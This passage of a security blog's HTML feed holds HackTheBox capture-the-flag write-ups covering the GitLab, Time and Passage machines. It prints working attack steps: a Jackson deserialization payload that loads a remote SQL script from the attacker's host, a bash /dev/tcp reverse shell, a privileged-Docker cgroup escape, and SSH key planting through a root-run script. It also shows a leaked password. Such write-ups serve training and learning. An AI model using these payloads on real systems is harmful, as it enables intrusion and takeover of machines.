&lt;span class="code-line"&gt;git@gitlab:/$ find / -name &amp;#39;user.txt&amp;#39; 2&amp;gt;/dev/null&lt;/span&gt;
&lt;span class="code-line"&gt;find / -name &amp;#39;user.txt&amp;#39; 2&amp;gt;/dev/null&lt;/span&gt;
&lt;span class="code-line"&gt;/home/dude/user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;git@gitlab:/$ cat /home/dude/user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;cat /home/dude/user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;e1e30b052b6ec0670698805d745e7682&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;h2 id="enumeration"&gt;Enumeration&lt;/h2&gt;
&lt;p&gt;We enumerate a few file and find the &lt;code&gt;/opt/backup/&lt;/code&gt; directory which contain a few
files. The file &lt;code&gt;gitlab.rb&lt;/code&gt; contain a smtp password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;git@gitlab:/opt/backup$ grep -i pass gitlab.rb&lt;/span&gt;
&lt;span class="code-line"&gt;grep -i pass gitlab.rb&lt;/span&gt;
&lt;span class="code-line"&gt;#### Email account password&lt;/span&gt;
&lt;span class="code-line"&gt;# gitlab_rails[&amp;#39;incoming_email_password&amp;#39;] = &amp;quot;[REDACTED]&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;#     password: &amp;#39;_the_password_of_the_bind_user&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;#     password: &amp;#39;_the_password_of_the_bind_user&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;#   &amp;#39;/users/password&amp;#39;,&lt;/span&gt;
&lt;span class="code-line"&gt;#### Change the initial default admin password and shared runner registration tokens.&lt;/span&gt;
&lt;span class="code-line"&gt;# gitlab_rails[&amp;#39;initial_root_password&amp;#39;] = &amp;quot;password&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;# gitlab_rails[&amp;#39;db_password&amp;#39;] = nil&lt;/span&gt;
&lt;span class="code-line"&gt;# gitlab_rails[&amp;#39;redis_password&amp;#39;] = nil&lt;/span&gt;
&lt;span class="code-line"&gt;    gitlab_rails[&amp;#39;smtp_password&amp;#39;] = &amp;quot;wW59U!ZKMbG9+*#h&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;# gitlab_shell[&amp;#39;http_settings&amp;#39;] = { user: &amp;#39;username&amp;#39;, password: &amp;#39;password&amp;#39;, ca_file: &amp;#39;/etc/ssl/cert.pem&amp;#39;, ca_path: &amp;#39;/etc/pki/tls/certs&amp;#39;, self_signed_cert: false}&lt;/span&gt;
&lt;span class="code-line"&gt;##! `SQL_USER_PASSWORD_HASH` can be generated using the command `gitlab-ctl pg-password-md5 gitlab`&lt;/span&gt;
&lt;span class="code-line"&gt;# postgresql[&amp;#39;sql_user_password&amp;#39;] = &amp;#39;SQL_USER_PASSWORD_HASH&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;# postgresql[&amp;#39;sql_replication_password&amp;#39;] = &amp;quot;md5 hash of postgresql password&amp;quot; # You can generate with `gitlab-ctl pg-password-md5 &amp;lt;dbuser&amp;gt;`&lt;/span&gt;
&lt;span class="code-line"&gt;# redis[&amp;#39;password&amp;#39;] = &amp;#39;redis-password-goes-here&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;####! **Master password should have the same value defined in&lt;/span&gt;
&lt;span class="code-line"&gt;####!   redis[&amp;#39;password&amp;#39;] to enable the instance to transition to/from&lt;/span&gt;
&lt;span class="code-line"&gt;# redis[&amp;#39;master_password&amp;#39;] = &amp;#39;redis-password-goes-here&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;# geo_secondary[&amp;#39;db_password&amp;#39;] = nil&lt;/span&gt;
&lt;span class="code-line"&gt;# geo_postgresql[&amp;#39;pgbouncer_user_password&amp;#39;] = nil&lt;/span&gt;
&lt;span class="code-line"&gt;#     password: PASSWORD&lt;/span&gt;
&lt;span class="code-line"&gt;###! generate this with `echo -n &amp;#39;$password + $username&amp;#39; | md5sum`&lt;/span&gt;
&lt;span class="code-line"&gt;# pgbouncer[&amp;#39;auth_query&amp;#39;] = &amp;#39;SELECT username, password FROM public.pg_shadow_lookup($1)&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;#     password: MD5_PASSWORD_HASH&lt;/span&gt;
&lt;span class="code-line"&gt;# postgresql[&amp;#39;pgbouncer_user_password&amp;#39;] = nil&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We need an interactive shell to be able to input a password, we use python for
that purpose and end up with a shell as root.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;git@gitlab:~/gitlab-rails/working$ python3 -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;orking$ python3 -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;git@gitlab:~/gitlab-rails/working$ su&lt;/span&gt;
&lt;span class="code-line"&gt;su&lt;/span&gt;
&lt;span class="code-line"&gt;Password: wW59U!ZKMbG9+*#h&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;root@gitlab:/var/opt/gitlab/gitlab-rails/working# id&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Nonetheless we cannot find any &lt;code&gt;root.txt&lt;/code&gt; file. As you probably already guess or
notice we are in a docker container.&lt;/p&gt;
&lt;h2 id="docker-escape"&gt;Docker escape&lt;/h2&gt;
&lt;p&gt;We run &lt;a href="https://github.com/stealthcopter/deepce"&gt;deepce&lt;/a&gt;: Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
We use a python server on our kalibox to transfer the script using &lt;code&gt;wget --recursive --no-parent http://10.10.14.18:8000&lt;/code&gt;.
And we run it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Privileged Mode ......... Yes&lt;/span&gt;
&lt;span class="code-line"&gt;The container appears to be running in privilege mode, we should be able to access the&lt;/span&gt;
&lt;span class="code-line"&gt;raw disks and mount the hosts root partition in order to gain code execution.&lt;/span&gt;
&lt;span class="code-line"&gt;See https://stealthcopter.github.io/deepce/guides/docker-privileged.md&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;An other quick Google research allow us to find a &lt;a href="https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1"&gt;medium article&lt;/a&gt;
to learn more about docker's privilege mode with a few command line to execute a
command on the system. We just replace the &lt;code&gt;echo "ps aux &amp;gt; $host_path/output" &amp;gt;&amp;gt; /cmd&lt;/code&gt; line
with &lt;code&gt;echo "cat /root/root.txt &amp;gt; $host_path/output" &amp;gt;&amp;gt; /cmd&lt;/code&gt; and grab the root
hash.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;root@gitlab:/tmp/.plop# echo &amp;quot;cat /root/root.txt &amp;gt; $host_path/output&amp;quot; &amp;gt;&amp;gt; /cmd&lt;/span&gt;
&lt;span class="code-line"&gt;echo &amp;quot;cat /root/root.txt &amp;gt; $host_path/output&amp;quot; &amp;gt;&amp;gt; /cmd&lt;/span&gt;
&lt;span class="code-line"&gt;root@gitlab:/tmp/.plop# sh -c &amp;quot;echo \$\$ &amp;gt; /tmp/cgrp/x/cgroup.procs&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;sh -c &amp;quot;echo \$\$ &amp;gt; /tmp/cgrp/x/cgroup.procs&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;root@gitlab:/tmp/.plop# cat /output&lt;/span&gt;
&lt;span class="code-line"&gt;cat /output&lt;/span&gt;
&lt;span class="code-line"&gt;b7f98681505cd39066f67147b103c2b3&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;The box is not that hard (less than &lt;a href="2021/05/htb-laboratory.html"&gt;laboratory&lt;/a&gt;) and quit interesting
as the exploitation of the gitlab's SSRF and its upgrade to an RCE was really
interesting and detailed on the blog article.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="gitlab"></category><category term="docker"></category></entry><entry><title>HTB: Time</title><link href="https://maggick.fr/2021/04/htb-time.html" rel="alternate"></link><published>2021-04-07T19:20:00+02:00</published><updated>2021-04-07T19:20:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-04-07:/2021/04/htb-time.html</id><summary type="html">&lt;p&gt;&lt;img alt="Time Card" class="align-left" src="/media/2021.04/time_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/286"&gt;Time&lt;/a&gt; publish on
October 24, 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/94858"&gt;egotisticalSW&lt;/a&gt; and
&lt;a href="https://www.hackthebox.eu/home/users/profile/27390"&gt;felamos &lt;/a&gt;.
This box is rated as a medium box. It implies a hard foothold using Jackson and
some Google fu. The root part is quit fast as there is a writable bash script
running regularly as root.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.04/time_card.png" alt="Time Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/286"&gt;Time&lt;/a&gt; publish on
October 24, 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/94858"&gt;egotisticalSW&lt;/a&gt; and
&lt;a href="https://www.hackthebox.eu/home/users/profile/27390"&gt;felamos &lt;/a&gt;.
This box is rated as a medium box. It implies a hard foothold using Jackson and
some Google fu. The root part is quit fast as there is a writable bash script
running regularly as root.&lt;/p&gt;


&lt;h1 id="foothold"&gt;Foothold&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 80 (HTTP) and 22 (SSH) are
open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Wed Nov  11 12:02:12 2020 as: nmap -sS -p- -oN nmap 10.129.29.179&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.129.29.179&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.012s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Wed Nov  11 12:02:28 2020 -- 1 IP address (1 host up) scanned in 15.91 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The website is an online tool to beautify and validate json data.&lt;/p&gt;
&lt;p&gt;![/media/2020.xx/time_01.png]&lt;/p&gt;
&lt;p&gt;When we try to validate "garbage" input. We got an error message "Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'qe': was expecting ('true', 'false' or 'null')"&lt;/p&gt;
&lt;p&gt;We see that the website is using the Jackson library.&lt;/p&gt;
&lt;p&gt;As we want a RCE we start a few Google search with "jackson fasterxml rce".
The results are from 2017:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;https://medium.com/@swapneildash/understanding-insecure-implementation-of-jackson-deserialization-7b3d409d2038&lt;/li&gt;
&lt;li&gt;https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/&lt;/li&gt;
&lt;li&gt;https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We continue our searches and finally get to "jackson gadget". Which lead us to a
more recent &lt;a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html"&gt;article about Jackson gadgets&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We send the following request (we just URL encoded the data parameter)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST / HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: 10.129.29.179&lt;/span&gt;
&lt;span class="code-line"&gt;User-Agent: Mozilla/4.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&lt;/span&gt;
&lt;span class="code-line"&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span&gt;
&lt;span class="code-line"&gt;Accept-Language: en-US,en;q=0.5&lt;/span&gt;
&lt;span class="code-line"&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 174&lt;/span&gt;
&lt;span class="code-line"&gt;Origin: http://10.129.29.179&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
&lt;span class="code-line"&gt;Referer: http://10.129.29.179/&lt;/span&gt;
&lt;span class="code-line"&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;mode=2&amp;amp;data=[&amp;quot;ch.qos.logback.core.db.DriverManagerConnectionSource&amp;quot;,+{&amp;quot;url&amp;quot;:&amp;quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT+FROM+&amp;#39;http://10.10.14.25:8000/inject.sql&amp;#39;&amp;quot;}]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Our inject.sql file looks like the following:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;:::text&lt;/span&gt;
&lt;span class="code-line"&gt;CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {&lt;/span&gt;
&lt;span class="code-line"&gt;        String[] command = {&amp;quot;bash&amp;quot;, &amp;quot;-c&amp;quot;, cmd};&lt;/span&gt;
&lt;span class="code-line"&gt;        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&amp;quot;\\A&amp;quot;);&lt;/span&gt;
&lt;span class="code-line"&gt;        return s.hasNext() ? s.next() : &amp;quot;&amp;quot;;  }&lt;/span&gt;
&lt;span class="code-line"&gt;$$;&lt;/span&gt;
&lt;span class="code-line"&gt;CALL SHELLEXEC(&amp;#39;&amp;lt;payload&amp;gt;&amp;#39;)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We start with a first simple payload &lt;code&gt;wget http://10.10.14.25:8000/rce&lt;/code&gt;
as we see the query in our python server log we know that we have RCE&lt;/p&gt;
&lt;p&gt;We change the payload to get a &lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"&gt;reverse shell&lt;/a&gt;
&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.25/4242 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This allows us to get a shell and grab the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:/tmp$ nc -l -p4242&lt;/span&gt;
&lt;span class="code-line"&gt;bash: cannot set terminal process group (958): Inappropriate ioctl for device&lt;/span&gt;
&lt;span class="code-line"&gt;bash: no job control in this shell&lt;/span&gt;
&lt;span class="code-line"&gt;pericles@time:/var/www/html$ cat /home/pericles/user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;cat /home/pericles/user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;74555f76d2e8013945afd9233ca2f219&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;We start by checking our privileges. We are not part of any specific group. As we don't know our password we cannot use sudo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pericles@time:/var/www/html$ id&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As we want to transfer file and have a better shell, we "upload" our SSH key:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mkdir /home/pericles/.ssh&lt;/span&gt;
&lt;span class="code-line"&gt;echo &amp;#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/ElCFvS&amp;lt;SNIP&amp;gt;&amp;#39; &amp;gt; /home/pericles/.ssh/authorized_keys&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We upload &lt;a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS"&gt;linpeas&lt;/a&gt; using scp and run it.
We discover that we have access to the /usr/bin/timer_backup.sh file (read and write)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[+] .sh files in path&lt;/span&gt;
&lt;span class="code-line"&gt;[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/gettext.sh&lt;/span&gt;
&lt;span class="code-line"&gt;You own the script: /usr/bin/timer_backup.sh&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/rescan-scsi-bus.sh&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We take a look at the file. It seems that root is regulary making a backup of the website.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pericles@time:~$ cat /usr/bin/timer_backup.sh&lt;/span&gt;
&lt;span class="code-line"&gt;#!/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;zip -r website.bak.zip /var/www/html &amp;amp;&amp;amp; mv website.bak.zip /root/backup.zip&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We modify the file using Vim and add the following lines&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mkdir /root/.ssh&lt;/span&gt;
&lt;span class="code-line"&gt;echo &amp;#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/ElCFv&amp;lt;SNIP&amp;gt;&amp;#39; &amp;gt; /root/.ssh/authorized_keys&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Waiting a few seconds and connecting back to the box with the root user allow us to get a shell and grab the flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ ssh root@10.129.29.179&lt;/span&gt;
&lt;span class="code-line"&gt;Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Last login: Fri Oct 23 10:05:26 2020&lt;/span&gt;
&lt;span class="code-line"&gt;root@time:~# cat root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;50fb5aa6e01ec64a77c48d42cf533088&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;The root part was easy, the jackson exploitation was harder and mostly some Google fu.
Nonetheless an interesting box to play with Java Deserialization vulnerabilities.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="linux"></category><category term="jackson"></category><category term="deserialization"></category></entry><entry><title>HTB: Passage</title><link href="https://maggick.fr/2021/03/htb-passage.html" rel="alternate"></link><published>2021-03-09T09:20:00+01:00</published><updated>2021-03-09T09:20:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-03-09:/2021/03/htb-passage.html</id><summary type="html">&lt;p&gt;&lt;img alt="Passage Card" class="align-left" src="/media/2021.03/passage_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/275"&gt;Passage&lt;/a&gt; publish on
September 2, 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/140851"&gt;ChefByzen&lt;/a&gt;.
This box is rated as a medium box. It implies two public exploit and a shared SSH
private key.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.03/passage_card.png" alt="Passage Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/275"&gt;Passage&lt;/a&gt; publish on
September 2, 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/140851"&gt;ChefByzen&lt;/a&gt;.
This box is rated as a medium box. It implies two public exploit and a shared SSH
private key.&lt;/p&gt;


&lt;h1 id="foothold"&gt;Foothold&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 80 (HTTP) and 22 (SSH) are
open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sun Sep 13 03:46:59 2020 as: nmap -p- -sSV -oN nmap 10.10.10.206&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.206&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.086s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;We browse to the website. This is a simple blog with some news. One of them is
about a &lt;a href="https://www.fail2ban.org/wiki/index.php/Main_Page"&gt;fail2ban&lt;/a&gt;
implementation. This will dissuade us to brute force login interfaces (which
rarely happen on HTB) and run &lt;code&gt;dirb&lt;/code&gt; against the site.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Passage News index" src="/media/2021.03/passage_01.png"&gt;&lt;/p&gt;
&lt;p&gt;When looking at the bottom of the page we see that the blog is "Powered by
CuteNews". A few Google search lead us to the admin panel located at &lt;code&gt;/CuteNews&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="Cute News login page" src="/media/2021.03/passage_02.png"&gt;&lt;/p&gt;
&lt;p&gt;We cannot login as we don't have any creds nor create an account.
We also check the available exploit for this CuteNews version (2.1.2).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ searchsploit CuteNews 2.1.2&lt;/span&gt;
&lt;span class="code-line"&gt;----------------------------------------------------------- ---------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Exploit Title                                             |  Path&lt;/span&gt;
&lt;span class="code-line"&gt;----------------------------------------------------------- ---------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;CuteNews 2.1.2 - &amp;#39;avatar&amp;#39; Remote Code Execution (Metasploi | php/remote/46698.rb&lt;/span&gt;
&lt;span class="code-line"&gt;CuteNews 2.1.2 - Arbitrary File Deletion                   | php/webapps/48447.txt&lt;/span&gt;
&lt;span class="code-line"&gt;CuteNews 2.1.2 - Authenticated Arbitrary File Upload       | php/webapps/48458.txt&lt;/span&gt;
&lt;span class="code-line"&gt;----------------------------------------------------------- ---------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Shellcodes: No Results&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We import the 'Avatar' exploit into metasploit using &lt;a href="https://github.com/rapid7/metasploit-framework/wiki/Running-Private-Modules"&gt;rapid7 guide&lt;/a&gt;.
We register an account an launch the exploit and got a reverse shell as &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We look at the available files. We found the &lt;code&gt;cdata&lt;/code&gt; folder just a level above
and then the &lt;code&gt;users&lt;/code&gt; directory. We display some of them. They contain base64
encoded user data. Some of them contain a SHA256 hashed password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat b0.php&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;?php die(&amp;#39;Direct call - access denied&amp;#39;); ?&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTYwMDA4MDM1OSI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
